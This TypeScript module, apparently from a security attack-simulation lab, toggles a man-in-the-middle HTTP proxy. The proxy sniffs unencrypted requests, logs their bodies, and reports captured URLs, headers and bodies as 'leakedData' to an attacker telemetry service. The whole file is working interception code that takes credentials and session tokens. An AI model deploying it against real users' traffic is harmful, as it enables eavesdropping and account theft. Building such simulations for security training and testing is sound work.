import http from 'http';
import { sendAttackerTelemetry } from '../services/telemetry.service.js';

let mitmProxyServer: http.Server | null = null;
let isMitmActive = false;

export async function toggleMitmAttack(enable: boolean, proxyPort: number = 8080, targetHost: string = 'http://localhost:3000') {
  if (enable && !isMitmActive) {
    isMitmActive = true;
    console.log(`[MITM Attack] Bật chế độ nghe lén Proxy tại cổng ${proxyPort} chuyển tiếp đến ${targetHost}`);

    // Tạo HTTP proxy trung gian nghe lén gói tin không mã hóa
    mitmProxyServer = http.createServer((clientReq, clientRes) => {
      let bodyData = '';
      clientReq.on('data', (chunk) => {
        bodyData += chunk;
      });

      clientReq.on('end', async () => {
        console.log(`[MITM Sniffer] Bắt được gói tin: ${clientReq.method} ${clientReq.url}`);
        if (bodyData) {
          console.log(`[MITM Sniffer] Nội dung chưa mã hóa: ${bodyData}`);
          await sendAttackerTelemetry('ATTACK_RESULT', 'CRITICAL', {
            attackType: 'MITM',
            payload: `Intercepted ${clientReq.method} ${clientReq.url}`,
            success: true,
            leakedData: {
              url: clientReq.url,
              headers: clientReq.headers,
              interceptedBody: bodyData
            }
          });
        }

        // Chuyển tiếp request đến Target Server
        const proxyReq = http.request(
          `${targetHost}${clientReq.url}`,
          {
            method: clientReq.method,
            headers: clientReq.headers
          },
          (proxyRes) => {
            clientRes.writeHead(proxyRes.statusCode || 200, proxyRes.headers);
            proxyRes.pipe(clientRes);
          }
        );

        proxyReq.on('error', (err) => {
          clientRes.statusCode = 502;
          clientRes.end('Bad Gateway: ' + err.message);
        });

        if (bodyData) proxyReq.write(bodyData);
        proxyReq.end();
      });
    });

    mitmProxyServer.listen(proxyPort);

    await sendAttackerTelemetry('ATTACK_TRIGGERED', 'WARNING', {
      attackType: 'MITM',
      target: targetHost,
      status: 'STARTED',
      payloadExample: `Proxy sniffer listening on port ${proxyPort}`
    });

    return { active: true, message: `MITM Proxy listening on port ${proxyPort}` };
  } else if (!enable && isMitmActive) {
    if (mitmProxyServer) {
      mitmProxyServer.close();
      mitmProxyServer = null;
    }
    isMitmActive = false;
    console.log('[MITM Attack] Đã tắt chế độ nghe lén');

    await sendAttackerTelemetry('ATTACK_TRIGGERED', 'INFO', {
      attackType: 'MITM',
      target: targetHost,
      status: 'STOPPED'
    });

    return { active: false, message: 'MITM Proxy stopped' };
  }

  return { active: isMitmActive, message: `MITM Proxy is currently ${isMitmActive ? 'active' : 'inactive'}` };
}
